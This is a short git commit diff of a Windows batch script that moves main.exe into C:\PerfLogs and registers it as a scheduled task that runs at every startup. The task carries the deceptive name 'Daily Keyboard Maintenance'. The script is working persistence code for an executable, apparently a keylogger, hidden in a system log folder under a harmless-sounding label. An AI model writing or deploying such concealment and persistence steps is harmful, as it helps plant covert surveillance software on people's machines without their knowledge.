8cd2b32b0013135533832e5ce1ae29465808f6be
aymynx <37952659+aymynx@users.noreply.github.com>
2022-10-18 16:48:10 +0100

    Added custom file location

--- script.bat
+++ script.bat
@@ -1,3 +1,4 @@
-schtasks /create /sc ONSTART /tn "Daily Keyboard Maintenance" /tr \\main.exe
-echo "Task added"
-
+:: Edit following variable for desired location
+set location=C:\PerfLogs
+move main.exe %location%
+schtasks /create /sc ONSTART /tn "Daily Keyboard Maintenance" /tr %location%\main.exe
